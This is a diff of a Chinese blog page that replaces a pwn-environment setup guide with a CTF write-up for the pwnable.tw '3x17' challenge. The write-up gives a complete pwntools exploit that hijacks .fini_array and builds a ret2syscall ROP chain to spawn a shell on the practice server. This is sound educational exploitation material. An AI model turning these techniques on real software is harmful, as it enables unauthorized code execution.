@@ -23,24 +23,22 @@
     var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"manual","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。">
+  <meta name="description" content="第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pwn虚拟机环境配置超详细版">
-<meta property="og:url" content="http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/index.html">
+<meta property="og:title" content="pwnable-3x17">
+<meta property="og:url" content="http://example.com/2024/01/26/pwnable-3x17/index.html">
 <meta property="og:site_name" content="feichai的博客">
-<meta property="og:description" content="原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。">
+<meta property="og:description" content="第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/3cdadb568be0e7fd2c61ba98cc52b4e.png">
-<meta property="og:image" content="http://example.com/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/07cbfa76506005efce49fd5569dd577.png">
-<meta property="og:image" content="http://example.com/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/b4fe46c11a942b09df37ba6307ca76a.png">
-<meta property="og:image" content="http://example.com/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/f97382479d97ce7d0d812ada2fe34ff.png">
-<meta property="article:published_time" content="2023-10-18T05:15:10.000Z">
-<meta property="article:modified_time" content="2024-01-26T03:31:33.608Z">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg">
+<meta property="og:image" content="http://example.com/imgs/$%7Bfiilename%7D/pwnable-3x17-2.png">
+<meta property="article:published_time" content="2024-01-26T10:52:51.000Z">
+<meta property="article:modified_time" content="2024-01-26T12:31:32.909Z">
 <meta property="article:author" content="肥柴">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/3cdadb568be0e7fd2c61ba98cc52b4e.png">
+<meta name="twitter:image" content="http://example.com/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg">
 
-<link rel="canonical" href="http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/">
+<link rel="canonical" href="http://example.com/2024/01/26/pwnable-3x17/">
 
 
 <script id="page-configurations">
@@ -53,7 +51,7 @@
   };
 </script>
 
-  <title>Pwn虚拟机环境配置超详细版 | feichai的博客</title>
+  <title>pwnable-3x17 | feichai的博客</title>
   
 
 
@@ -207,7 +205,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2024/01/26/pwnable-3x17/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.png">
@@ -220,7 +218,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          Pwn虚拟机环境配置超详细版
+          pwnable-3x17
         </h1>
 
         <div class="post-meta">
@@ -230,16 +228,10 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2023-10-18 13:15:10" itemprop="dateCreated datePublished" datetime="2023-10-18T13:15:10+08:00">2023-10-18</time>
+              <time title="创建时间：2024-01-26 18:52:51 / 修改时间：20:31:32" itemprop="dateCreated datePublished" datetime="2024-01-26T18:52:51+08:00">2024-01-26</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2024-01-26 11:31:33" itemprop="dateModified" datetime="2024-01-26T11:31:33+08:00">2024-01-26</time>
-              </span>
 
           
             <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
@@ -254,7 +246,7 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>2.2k</span>
+              <span>1.8k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
@@ -273,85 +265,23 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>原来的虚拟机被我搞崩了，只能重装了(脚本全无了呜呜呜)，看到网上的安装教程都比较零碎，多多少少也有点小瑕疵，因此，我决定水一篇博客(bushi)，写一下我的pwn虚拟机环境全套安装路程。</p>
+        <p>第一反应有点像之前做过的一道fmt漏洞，通过修改fini.array地址内容为mian地址达到无限次循环，这个题省略了fmt漏洞，让你可以直接修改地址内容，根据程序执行流程图，main函数执行完后会执行fini.array</p>
 <span id="more"></span>
 
-<h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p>Linux版本：Ubuntu20.04</p>
-<p>Python版本：Python3.8.10</p>
-<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="vim"><a href="#vim" class="headerlink" title="vim"></a>vim</h3><p>这个没什么大问题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install vim</span><br></pre></td></tr></table></figure>
+<p>那么程序流程为</p>
+<p>__libc_csu_init -&gt; .init_array -&gt;main -&gt; __libc_csu_fini  -&gt; .fini_array[1] -&gt;.fini_array[0]  </p>
+<p>如果将fini_array[1]覆盖为main</p>
+<p>fini_array[0]覆盖为__libc_csu_fini，那么就完成了无限循环</p>
+<p>补充一点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">在执行init.array时会依次调用</span><br><span class="line">.init_array[0] </span><br><span class="line">.init_array[1]</span><br><span class="line">...</span><br><span class="line">.init_array[n]</span><br><span class="line"></span><br><span class="line">而fini.array则是相反</span><br><span class="line">.fini_array[n] </span><br><span class="line">.fini_array[n-1] </span><br><span class="line">... </span><br><span class="line">.fini_array[0]</span><br></pre></td></tr></table></figure>
 
-<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p>先按个pip，再按pwntools</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python3-pip</span><br><span class="line">pip install pwntools</span><br></pre></td></tr></table></figure>
+<p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-1.jpg" alt="pwnable-3x17-1"></p>
+<p>但是程序中有一个点要注意一下，每次byte_4B9330都会自增1，且当byte_4B9330为1的时候才可以写，不过问题不大，因为unsigned_int8的范围是0~255，只用循环多次就能回到1</p>
+<p><img src="/imgs/$%7Bfiilename%7D/pwnable-3x17-2.png" alt="pwnable-3x17-2"></p>
+<p>然后就是ret2syscall，最后要用leave ret执行shellcode</p>
+<p>exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ae64 <span class="keyword">import</span> AE64</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(<span class="string">&#x27;/home/feichai/ctf_file/pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;chall.pwnable.tw&#x27;</span>, <span class="number">10105</span>)</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&quot;amd64&quot;</span>,os=<span class="string">&quot;linux&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">elf=ELF(<span class="string">&quot;/home/feichai/ctf_file/chal&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">libcc=cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax = <span class="number">0x41e4af</span></span><br><span class="line">pop_rdi =<span class="number">0x401696</span></span><br><span class="line">pop_rsi =<span class="number">0x406c30</span></span><br><span class="line">pop_rdx =<span class="number">0x446e35</span></span><br><span class="line">leave_ret =<span class="number">0x401c4b</span></span><br><span class="line">ret =<span class="number">0x401016</span></span><br><span class="line">mian_addr = <span class="number">0x401B6D</span></span><br><span class="line">fini_array =<span class="number">0x4B40F0</span></span><br><span class="line">fini =<span class="number">0x402960</span></span><br><span class="line">syscall =<span class="number">0x4022b4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ropchain</span>(<span class="params">addr,data</span>):</span><br><span class="line">    p.sendafter(<span class="string">b&quot;addr:&quot;</span>,<span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendafter(<span class="string">b&quot;data:&quot;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    </span><br><span class="line">    ropchain(fini_array,p64(fini)+p64(mian_addr))</span><br><span class="line">    ropchain(<span class="number">0x4b92e0</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>) <span class="comment">#bss</span></span><br><span class="line">    ropchain(fini_array+<span class="number">0x10</span>,p64(pop_rax)+p64(<span class="number">59</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x20</span>,p64(pop_rdi)+p64(<span class="number">0x4b92e0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x30</span>,p64(pop_rsi)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x40</span>,p64(pop_rdx)+p64(<span class="number">0</span>))</span><br><span class="line">    ropchain(fini_array+<span class="number">0x50</span>,p64(syscall))</span><br><span class="line">    ropchain(fini_array,p64(leave_ret)+p64(ret))</span><br><span class="line"></span><br><span class="line">    p.interactive() </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>
 
-<h3 id="pwndbg"><a href="#pwndbg" class="headerlink" title="pwndbg"></a>pwndbg</h3><p>先按个git，再安装pwndbg</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install git</span><br><span class="line">git clone https://github.com/pwndbg/pwndbg</span><br><span class="line">cd pwndbg</span><br><span class="line">sudo ./setup.sh</span><br></pre></td></tr></table></figure>
-
-<p>然后测试一下是否成功</p>
-<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/3cdadb568be0e7fd2c61ba98cc52b4e.png"></p>
-<p>出现上面的红色的pwndbg&gt;即为成功，若不是，而是出现原始版的 (gdb) ,则需要配置一下默认的调试器</p>
-<p>命令行输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim ~/.gdbinit</span><br></pre></td></tr></table></figure>
-
-<p>按 i 键可进行编辑，然后添加下面代码，然后再按 Esc 键可以退出编辑模式，输入 :wq 然后回车即可保存退出即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">source ~/pwndbg/gdbinit.py</span><br></pre></td></tr></table></figure>
-
-<p>如下</p>
-<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/07cbfa76506005efce49fd5569dd577.png"></p>
-<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install checksec</span><br></pre></td></tr></table></figure>
-
-<p>之前用的checksec是下面的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec filename</span><br></pre></td></tr></table></figure>
-
-<p>但是今天重新安装的这个改了，需要用到下面的格式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec --file=filename</span><br></pre></td></tr></table></figure>
-
-<p><img src="/../imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/b4fe46c11a942b09df37ba6307ca76a.png"></p>
-<h3 id="LibcSearcher"><a href="#LibcSearcher" class="headerlink" title="LibcSearcher"></a>LibcSearcher</h3><p>网上的方法大部分都是Python2的方法，对于Python3基本不管用，建议Python3的用这个安装，就是有个缺点，没网的时候不能用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install LibcSearcher</span><br></pre></td></tr></table></figure>
-
-<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python-capstone</span><br><span class="line">git clone https://github.com/JonathanSalwan/ROPgadget.git</span><br></pre></td></tr></table></figure>
-
-<p>这里第二句如果报错说无法连接gitHub的话，我的做法是换镜像源，没报错就跳过下面这段代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git config --global url.&quot;https://ghproxy.com/https://github.com&quot;.insteadOf &quot;https://github.com&quot;</span><br></pre></td></tr></table></figure>
-
-<p>然后</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ROPgadget</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure>
-
-<p>然后在命令行输入ROPgadget测试一下</p>
-<p>如果报错，如下</p>
-<p><img src="/imgs/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/f97382479d97ce7d0d812ada2fe34ff.png"></p>
-<p>意思是缺少上面红色框框内的文件</p>
-<p>很简单就可以解决，注意下面代码的路径是你自己电脑上的报错路径，其他的不用改，如我报错路径是上面红色框框内的内容，我就需要输入以下代码</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp -r scripts /home/feichai/.local/lib/python3.8/site-packages/ROPGadget-7.4.dist-info</span><br></pre></td></tr></table></figure>
-
-<p>注意这行代码需要在ROPgadget文件夹里面运行，因为代码中的scripts文件夹在ROPgadget文件夹里面，如果不在ROPgadget文件夹里面运行则需要自己把路径弄好</p>
-<h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>这个安装比较简单，运行下面代码即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby -y</span><br><span class="line">sudo apt-get install gem -y</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure>
-
-<h3 id="ifconfig"><a href="#ifconfig" class="headerlink" title="ifconfig"></a>ifconfig</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install net-tools</span><br></pre></td></tr></table></figure>
-
-<h3 id="lief"><a href="#lief" class="headerlink" title="lief"></a>lief</h3><p>AWD攻防插件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 -m pip3 install launchpadlib</span><br><span class="line">pip3 install setuptools --upgrade</span><br><span class="line">pip3 install lief</span><br></pre></td></tr></table></figure>
-
-<h3 id="alpha3"><a href="#alpha3" class="headerlink" title="alpha3"></a>alpha3</h3><p>用于可见shellcode转换</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/TaQini/alpha3.git</span><br><span class="line"></span><br><span class="line">#使用方法</span><br><span class="line">cd alpha3</span><br><span class="line">python ./ALPHA3.py x64 ascii mixedcase rax --input=&quot;存储shellcode的文件&quot; &gt; 输出文件</span><br></pre></td></tr></table></figure>
-
-<h3 id="ae64"><a href="#ae64" class="headerlink" title="ae64"></a>ae64</h3><p>也是用于可见shellcode转化</p>
-<p>下载下面的包后按照md文档安装即可</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/veritas501/ae64.git</span><br></pre></td></tr></table></figure>
-
-<p>如果报错：找不到importlib_resources模块</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install importlib_resources</span><br></pre></td></tr></table></figure>
-
-<p>然后再重新安装</p>
-<h3 id="seccomp-tools"><a href="#seccomp-tools" class="headerlink" title="seccomp-tools"></a>seccomp-tools</h3><p>分析沙盒的工具，ubuntu自带的ruby安装老是报错，可能是因为版本太低，所以我先删除了ubuntu自带的ruby，然后从[ruby官网](<a target="_blank" rel="noopener" href="https://www.ruby-lang.org/en/downloads/">Download Ruby (ruby-lang.org)</a>)上下载源码自行编译</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf ruby-3.0.0.tar</span><br><span class="line">cd ruby-3.0.0</span><br><span class="line">sudo ./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line">#编译完成后安装seccomp-tools</span><br><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure>
-
-<h3 id="patchelf"><a href="#patchelf" class="headerlink" title="patchelf"></a>patchelf</h3><p>用于修改程序动态链接库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install patchelf</span><br></pre></td></tr></table></figure>
-
-<p>本文持续更新中……</p>
 
     </div>
 
@@ -391,7 +321,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="http://example.com/2023/10/18/Pwn%E8%99%9A%E6%8B%9F%E6%9C%BA%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E8%B6%85%E8%AF%A6%E7%BB%86%E7%89%88/" title="Pwn虚拟机环境配置超详细版">http://example.com/2023/10/18/Pwn虚拟机环境配置超详细版/</a>
+    <a href="http://example.com/2024/01/26/pwnable-3x17/" title="pwnable-3x17">http://example.com/2024/01/26/pwnable-3x17/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
@@ -437,13 +367,10 @@
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2023/10/07/hello-world/" rel="prev" title="Hello World">
-      <i class="fa fa-chevron-left"></i> Hello World
+    <a href="/2024/01/25/pwnable-dubblesort/" rel="prev" title="pwnable-dubblesort">
+      <i class="fa fa-chevron-left"></i> pwnable-dubblesort
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2023/11/28/GeekChallenge-2023-wp-pwn-%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" rel="next" title="GeekChallenge 2023 wp pwn 部分题解">
-      GeekChallenge 2023 wp pwn 部分题解 <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -507,7 +434,6 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%89%88%E6%9C%AC%E8%AF%B4%E6%98%8E"><span class="nav-number">1.</span> <span class="nav-text">版本说明</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E9%85%8D%E7%BD%AE"><span class="nav-number">2.</span> <span class="nav-text">配置</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#vim"><span class="nav-number">2.1.</span> <span class="nav-text">vim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwntools"><span class="nav-number">2.2.</span> <span class="nav-text">pwntools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pwndbg"><span class="nav-number">2.3.</span> <span class="nav-text">pwndbg</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#checksec"><span class="nav-number">2.4.</span> <span class="nav-text">checksec</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#LibcSearcher"><span class="nav-number">2.5.</span> <span class="nav-text">LibcSearcher</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ROPgadget"><span class="nav-number">2.6.</span> <span class="nav-text">ROPgadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#one-gadget"><span class="nav-number">2.7.</span> <span class="nav-text">one_gadget</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ifconfig"><span class="nav-number">2.8.</span> <span class="nav-text">ifconfig</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lief"><span class="nav-number">2.9.</span> <span class="nav-text">lief</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alpha3"><span class="nav-number">2.10.</span> <span class="nav-text">alpha3</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ae64"><span class="nav-number">2.11.</span> <span class="nav-text">ae64</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#seccomp-tools"><span class="nav-number">2.12.</span> <span class="nav-text">seccomp-tools</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#patchelf"><span class="nav-number">2.13.</span> <span class="nav-text">patchelf</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
